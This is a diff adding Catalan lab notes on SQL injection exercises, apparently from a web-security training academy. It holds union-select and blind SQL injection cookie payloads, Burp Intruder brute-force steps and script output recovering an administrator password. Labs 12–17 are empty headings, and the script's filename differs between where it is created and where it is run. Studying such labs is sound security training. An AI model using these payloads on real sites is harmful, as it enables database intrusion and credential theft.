@@ -70,3 +70,63 @@
 	    OUTPUT: PASSWORD_HHELXQ, USERNAME_QLKZDD
     d) filter?category=Gifts' union select NULL,USERNAME_QLKZDD||':'||PASSWORD_HHELXQ from USERS_IFEEJB-- -
 	    OUTPUT: administrator/l5j55i07t8chg0l6j2jd
+
+## **Lab 11**: Blind SQL injection with conditional responses
+
+    Amb BurpSuite pillar la petició de la pàgina principal i la vulnerabilitat esta en canviar el valor de la Cookie.
+    Ens hem de fixar en el text "Welcome Back!".
+    Si surt, és perquè el nostre codi s'esta interpretant. Però no ens mostra el codi.
+    Si NO surt, és perquè el nostre codi NO s'esta interpretant i hi ha algun error.
+
+    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(username,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
+
+    Si enviem aquesta petició ens hauria de sortir "Welcome Back!", ja que si que existeix l'usuari admin.
+
+    Ara escrivim:
+    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
+
+    I enviarem aquesta petició a l'intruder.
+
+    A l'intruder on posa "Choose an attack type" farem tipus 'Sniper'.
+    Seleccionem la lletra "a" després de l'administrator i a la dreta posem ADD§.
+    La lletra a ens ha de quedar aixi: §a§
+
+    Ens dirigim a la pestanya de Payloads.
+    I on posa Payload Options (Simple List)
+    Anem afegint el nostre diccionari: a,b,c,d,e,f.. 1,2,3,4..
+    Tots els caracters que volguem.
+    A la dreta clickem StartAttack
+
+    Comprovara que la primera lletra de la password de l'usuari administrator sigui aquella.
+    Com que a la pagina ens mostra un "Welcome Back" si ha funcionat, ens haurem de fixar en la columna "length" de l'atac que acabem de fer.
+    Veig que tots tenen 11030 i la "k" un 11091.
+
+    Per tant, si en el Repeater li posem
+    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='k; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
+    Ens sortira el "Welcome Back!"
+    Això em diu que la primera lletra de la password serà "k".
+
+    Ens creem un script en Python anomenat SQLI_Conditional_Responses.py
+
+    Fem pip3 install pwntools
+
+    Abans de continuar amb l'script, volem averiguar de quants caracters esta feta la passwd.
+    Anem provant el numero fins que trobem que és de 20.
+    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select 'a' from users where username='administrator' and length(password)>=20)='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
+
+    OUTPUT SCRIPT:
+    python3 SQLI_Conditional_Error.py
+    [◢] Fuerza Bruta: NQLIhBYeW4w1MyVo' and (select substring(password,20,1) from users where username='administrator')='m
+    [→] Password: koa1z59sfl237dt7vmmm
+
+## **Lab 12**: Blind SQL injection with conditional errors
+
+## **Lab 13**: Blind SQL injection with time delays
+
+## **Lab 14**: Blind SQL injection with time delays and information retrieval
+
+## **Lab 15**: Blind SQL injection with out-of-band interaction
+
+## **Lab 16**: Blind SQL injection with out-of-band data exfiltration
+
+## **Lab 17**: SQL injection with filter bypass via XML encoding
